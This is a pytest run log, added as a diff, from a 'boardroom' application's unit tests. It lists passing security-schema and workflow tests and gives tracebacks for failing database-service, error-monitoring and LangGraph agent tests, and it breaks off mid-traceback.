+tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_defaults PASSED [ 79%]
+tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_custom_values PASSED [ 79%]
+tests/unit/test_security_schemas.py::TestSecretMetadata::test_secret_metadata_id_generation PASSED [ 80%]
+tests/unit/test_security_schemas.py::TestSecretValue::test_secret_value_creation PASSED [ 80%]
+tests/unit/test_security_schemas.py::TestSecretValue::test_secret_value_required_fields PASSED [ 80%]
+tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_creation PASSED [ 81%]
+tests/unit/test_security_schemas.py::TestStoredSecret::test_stored_secret_with_backup_info PASSED [ 81%]
+tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_defaults PASSED [ 81%]
+tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_with_details PASSED [ 81%]
+tests/unit/test_security_schemas.py::TestSecurityViolation::test_security_violation_id_generation PASSED [ 82%]
+tests/unit/test_security_schemas.py::TestSecurityPolicy::test_security_policy_defaults PASSED [ 82%]
+tests/unit/test_security_schemas.py::TestSecurityPolicy::test_security_policy_with_rules PASSED [ 82%]
+tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_defaults PASSED [ 83%]
+tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_with_violations PASSED [ 83%]
+tests/unit/test_security_schemas.py::TestSecurityScanResult::test_security_scan_result_id_generation PASSED [ 83%]
+tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_defaults PASSED [ 83%]
+tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_with_details PASSED [ 84%]
+tests/unit/test_security_schemas.py::TestAuditEvent::test_audit_event_id_generation PASSED [ 84%]
+tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_defaults PASSED [ 84%]
+tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_with_policies PASSED [ 84%]
+tests/unit/test_security_schemas.py::TestSecurityConfiguration::test_security_configuration_validation PASSED [ 85%]
+tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_required_fields PASSED [ 85%]
+tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_with_optional_fields PASSED [ 85%]
+tests/unit/test_security_schemas.py::TestSecretRequest::test_secret_request_validation PASSED [ 86%]
+tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_creation PASSED [ 86%]
+tests/unit/test_security_schemas.py::TestSecretResponse::test_secret_response_optional_fields PASSED [ 86%]
+tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_defaults PASSED [ 86%]
+tests/unit/test_security_schemas.py::TestHealthCheck::test_health_check_with_issues PASSED [ 87%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_default_policies_exist PASSED [ 87%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_default_policies_structure PASSED [ 87%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_no_hardcoded_secrets_policy PASSED [ 88%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_encryption_standards_policy PASSED [ 88%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_secure_protocols_policy PASSED [ 88%]
+tests/unit/test_security_schemas.py::TestDefaultSecurityPolicies::test_configuration_security_policy PASSED [ 88%]
+tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_complete_secret_lifecycle PASSED [ 89%]
+tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_security_violation_to_audit_event PASSED [ 89%]
+tests/unit/test_security_schemas.py::TestSecuritySchemaIntegration::test_comprehensive_security_configuration PASSED [ 89%]
+tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_malformed_security_data PASSED [ 89%]
+tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_security_token_generation_failure PASSED [ 90%]
+tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_datetime_edge_cases PASSED [ 90%]
+tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_large_data_structures PASSED [ 90%]
+tests/unit/test_security_schemas.py::TestSecuritySchemasEdgeCases::test_unicode_and_special_characters PASSED [ 91%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_success PASSED   [ 91%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_default_temperature PASSED [ 91%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_retry_logic PASSED [ 91%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_max_retries_exceeded PASSED [ 92%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_http_error PASSED [ 92%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_missing_env_vars PASSED [ 92%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_malformed_response PASSED [ 93%]
+tests/unit/test_workflow.py::TestCallLLM::test_call_llm_json_decode_error PASSED [ 93%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_success PASSED [ 93%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_missing_decision_id PASSED [ 93%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_missing_status PASSED [ 94%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_state_creation_error PASSED [ 94%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_execution_error PASSED [ 94%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_with_extra_fields PASSED [ 94%]
+tests/unit/test_workflow.py::TestRunBoardroomWorkflow::test_run_boardroom_workflow_complex_state PASSED [ 95%]
+tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_initialization FAILED [ 95%]
+tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_exists PASSED [ 95%]
+tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_pending_to_voting_transition PASSED [ 96%]
+tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_voting_to_completed_transition PASSED [ 96%]
+tests/unit/test_workflow.py::TestWorkflowStateTransitions::test_voting_to_expired_transition PASSED [ 96%]
+tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_quorum_validation PASSED [ 96%]
+tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_deadline_validation PASSED [ 97%]
+tests/unit/test_workflow.py::TestWorkflowBusinessRules::test_permission_validation PASSED [ 97%]
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_network_error_handling PASSED [ 97%]
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_timeout_error_handling PASSED [ 98%]
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_validation_error_handling PASSED [ 98%]
+tests/unit/test_workflow.py::TestWorkflowErrorHandling::test_generic_exception_handling PASSED [ 98%]
+tests/unit/test_workflow.py::TestWorkflowIntegration::test_workflow_with_llm_integration PASSED [ 98%]
+tests/unit/test_workflow.py::TestWorkflowIntegration::test_multi_step_workflow_execution PASSED [ 99%]
+tests/unit/test_workflow.py::TestWorkflowIntegration::test_workflow_with_complex_data_flow PASSED [ 99%]
+tests/unit/test_workflow.py::TestWorkflowPerformance::test_workflow_execution_timing PASSED [ 99%]
+tests/unit/test_workflow.py::TestWorkflowPerformance::test_workflow_memory_usage PASSED [100%]
+
+=================================== FAILURES ===================================
+__________ TestDatabaseServiceInitialization.test_initialize_success ___________
+tests/unit/test_database_service.py:56: in test_initialize_success
+    await service.initialize()
+app/services/database.py:84: in initialize
+    await self._test_connection()
+app/services/database.py:100: in _test_connection
+    async with self._engine.begin() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:09.660349Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:10.661762Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:12.664379Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+ERROR    app.core.logging:database.py:95 [2m2025-07-05T17:04:12.664625Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m95[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+______ TestDatabaseServiceInitialization.test_initialize_test_environment ______
+tests/unit/test_database_service.py:86: in test_initialize_test_environment
+    await service.initialize()
+app/services/database.py:84: in initialize
+    await self._test_connection()
+app/services/database.py:100: in _test_connection
+    async with self._engine.begin() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:12.730778Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:13.732325Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:15.734212Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+ERROR    app.core.logging:database.py:95 [2m2025-07-05T17:04:15.734416Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m95[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+________ TestDatabaseServiceInitialization.test_initialize_with_retries ________
+tests/unit/test_database_service.py:116: in test_initialize_with_retries
+    await service.initialize()
+app/services/database.py:84: in initialize
+    await self._test_connection()
+app/services/database.py:100: in _test_connection
+    async with self._engine.begin() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:15.750119Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: Connection failed[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:15.750380Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: Connection failed[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:15.750509Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+ERROR    app.core.logging:database.py:95 [2m2025-07-05T17:04:15.750572Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m95[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+_ TestDatabaseServiceSessionManagement.test_get_session_initializes_if_needed __
+tests/unit/test_database_service.py:199: in test_get_session_initializes_if_needed
+    mock_init.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.
+_ TestDatabaseServiceSessionManagement.test_get_session_operational_error_handling _
+tests/unit/test_database_service.py:219: in test_get_session_operational_error_handling
+    async with pytest.raises(OperationalError):
+E   TypeError: 'RaisesExc' object does not support the asynchronous context manager protocol
+_ TestDatabaseServiceSessionManagement.test_get_session_sqlalchemy_error_handling _
+tests/unit/test_database_service.py:241: in test_get_session_sqlalchemy_error_handling
+    async with pytest.raises(SQLAlchemyError):
+E   TypeError: 'RaisesExc' object does not support the asynchronous context manager protocol
+_ TestDatabaseServiceSessionManagement.test_get_session_generic_error_handling _
+tests/unit/test_database_service.py:261: in test_get_session_generic_error_handling
+    async with pytest.raises(Exception, match="Generic error"):
+E   TypeError: 'RaisesExc' object does not support the asynchronous context manager protocol
+___________ TestDatabaseServiceHealthCheck.test_health_check_healthy ___________
+tests/unit/test_database_service.py:295: in test_health_check_healthy
+    assert health["status"] == "healthy"
+E   AssertionError: assert 'unhealthy' == 'healthy'
+E     
+E     - healthy
+E     + unhealthy
+E     ? ++
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:database.py:180 [2m2025-07-05T17:04:18.835756Z[0m [[31m[1merror    [0m] [1mDatabase health check failed: 'NoneType' object has no attribute 'pool'[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35mhealth_check[0m [36mlineno[0m=[35m180[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+____ TestDatabaseServiceHealthCheck.test_health_check_initializes_if_needed ____
+tests/unit/test_database_service.py:384: in test_health_check_initializes_if_needed
+    mock_init.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'initialize' to have been called once. Called 0 times.
+------------------------------ Captured log call -------------------------------
+ERROR    app.core.logging:database.py:180 [2m2025-07-05T17:04:18.847631Z[0m [[31m[1merror    [0m] [1mDatabase health check failed: 'NoneType' object has no attribute 'pool'[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35mhealth_check[0m [36mlineno[0m=[35m180[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+_____ TestDatabaseServiceErrorHandling.test_session_error_during_operation _____
+tests/unit/test_database_service.py:544: in test_session_error_during_operation
+    mock_session.rollback.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
+_ TestDatabaseServiceErrorHandling.test_connection_recovery_after_operational_error _
+tests/unit/test_database_service.py:570: in test_connection_recovery_after_operational_error
+    mock_session.rollback.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
+____ TestDatabaseServiceConfigurationVariants.test_debug_mode_configuration ____
+tests/unit/test_database_service.py:658: in test_debug_mode_configuration
+    await service.initialize()
+app/services/database.py:84: in initialize
+    await self._test_connection()
+app/services/database.py:100: in _test_connection
+    async with self._engine.begin() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:18.968991Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:19.970909Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:21.973634Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+ERROR    app.core.logging:database.py:95 [2m2025-07-05T17:04:21.973850Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m95[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+_ TestDatabaseServiceConfigurationVariants.test_production_mode_configuration __
+tests/unit/test_database_service.py:683: in test_production_mode_configuration
+    await service.initialize()
+app/services/database.py:84: in initialize
+    await self._test_connection()
+app/services/database.py:100: in _test_connection
+    async with self._engine.begin() as conn:
+E   TypeError: 'coroutine' object does not support the asynchronous context manager protocol
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:21.990378Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 1 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:22.991975Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 2 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+WARNING  app.core.logging:database.py:91 [2m2025-07-05T17:04:24.994659Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m91[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+ERROR    app.core.logging:database.py:95 [2m2025-07-05T17:04:24.994942Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m95[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
+_ TestDatabaseServiceAdvancedOperations.test_create_user_with_duplicate_email __
+tests/unit/test_database_service.py:720: in test_create_user_with_duplicate_email
+    mock_session.rollback.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
+___ TestDatabaseServiceAdvancedOperations.test_database_transaction_rollback ___
+tests/unit/test_database_service.py:750: in test_database_transaction_rollback
+    mock_session.rollback.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
+____ TestDatabaseServiceAdvancedOperations.test_database_connection_timeout ____
+tests/unit/test_database_service.py:798: in test_database_connection_timeout
+    mock_session.rollback.assert_called_once()
+/usr/lib/python3.12/unittest/mock.py:923: in assert_called_once
+    raise AssertionError(msg)
+E   AssertionError: Expected 'rollback' to have been called once. Called 0 times.
+________ TestDatabaseServiceLegacyMethods.test_get_session_maker_method ________
+tests/unit/test_database_service.py:851: in test_get_session_maker_method
+    result = service.get_session_maker()
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+app/services/database.py:380: in get_session_maker
+    raise RuntimeError("Database service not initialized")
+E   RuntimeError: Database service not initialized
+______ TestErrorMonitorEdgeCases.test_window_edge_case_exactly_at_cutoff _______
+tests/unit/test_error_monitoring.py:464: in test_window_edge_case_exactly_at_cutoff
+    assert len(monitor.error_counts["test_error"]) == 1
+E   assert 2 == 1
+E    +  where 2 = len(deque([datetime.datetime(2023, 1, 1, 11, 0), datetime.datetime(2023, 1, 1, 12, 0)]))
+------------------------------ Captured log call -------------------------------
+WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T17:04:25.222702Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35mNone[0m [36merror_type[0m=[35mtest_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/test[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
+WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T17:04:25.222823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35mNone[0m [36merror_type[0m=[35mtest_error[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/test[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
+____________ TestBoardroomException.test_boardroom_exception_basic _____________
+tests/unit/test_exceptions.py:44: in test_boardroom_exception_basic
+    assert exception.error_code == "BOARDROOM_ERROR"
+E   AssertionError: assert 'LANGGRAPH_ERROR' == 'BOARDROOM_ERROR'
+E     
+E     - BOARDROOM_ERROR
+E     + LANGGRAPH_ERROR
+_____________ TestLangGraphAgent.test_get_model_kwargs_development _____________
+tests/unit/test_langgraph_graph.py:72: in test_get_model_kwargs_development
+    agent = LangGraphAgent()
+            ^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:85: in __init__
+    self.llm = ChatOpenAI(
+../.local/lib/python3.12/site-packages/langchain_core/load/serializable.py:130: in __init__
+    super().__init__(*args, **kwargs)
+E   pydantic_core._pydantic_core.ValidationError: 2 validation errors for ChatOpenAI
+E   model
+E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...L' id='124531238088928'>, input_type=MagicMock]
+E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
+E   api_key
+E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...Y' id='124531237474224'>, input_type=MagicMock]
+E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
+_____________ TestLangGraphAgent.test_get_model_kwargs_production ______________
+tests/unit/test_langgraph_graph.py:84: in test_get_model_kwargs_production
+    agent = LangGraphAgent()
+            ^^^^^^^^^^^^^^^^
+app/core/langgraph/graph.py:85: in __init__
+    self.llm = ChatOpenAI(
+../.local/lib/python3.12/site-packages/langchain_core/load/serializable.py:130: in __init__
+    super().__init__(*args, **kwargs)
+E   pydantic_core._pydantic_core.ValidationError: 2 validation errors for ChatOpenAI
+E   model
+E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...L' id='124531237566032'>, input_type=MagicMock]
+E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
+E   api_key
+E     Input should be a valid string [type=string_type, input_value=<MagicMock name='settings...Y' id='124531237567376'>, input_type=MagicMock]
+E       For further information visit https://errors.pydantic.dev/2.11/v/string_type
+_____________________ TestLangGraphAgent.test_chat_success _____________________
+/usr/lib/python3.12/unittest/mock.py:1567: in __enter__
+    setattr(self.target, self.attribute, new_attr)
+../.local/lib/python3.12/site-packages/pydantic/main.py:997: in __setattr__
+    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
+                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+../.local/lib/python3.12/site-packages/pydantic/main.py:1044: in _setattr_handler
+    raise ValueError(f'"{cls.__name__}" object has no field "{name}"')
+E   ValueError: "RunnableBinding" object has no field "ainvoke"
+
+During handling of the above exception, another exception occurred:
+../.local/lib/python3.12/site-packages/pydantic/main.py:1084: in __delattr__
+    object.__delattr__(self, item)
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+
+During handling of the above exception, another exception occurred:
+tests/unit/test_langgraph_graph.py:120: in test_chat_success
+    with patch.object(agent.llm, 'ainvoke', return_value=mock_llm_response):
+/usr/lib/python3.12/unittest/mock.py:1580: in __enter__
+    if not self.__exit__(*sys.exc_info()):
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/lib/python3.12/unittest/mock.py:1588: in __exit__
+    delattr(self.target, self.attribute)
+../.local/lib/python3.12/site-packages/pydantic/main.py:1086: in __delattr__
+    raise AttributeError(f'{type(self).__name__!r} object has no attribute {item!r}')
+E   AttributeError: 'RunnableBinding' object has no attribute 'ainvoke'
+________________ TestLangGraphAgent.test_chat_with_token_usage _________________
+/usr/lib/python3.12/unittest/mock.py:1567: in __enter__
+    setattr(self.target, self.attribute, new_attr)
+../.local/lib/python3.12/site-packages/pydantic/main.py:997: in __setattr__
+    elif (setattr_handler := self._setattr_handler(name, value)) is not None:
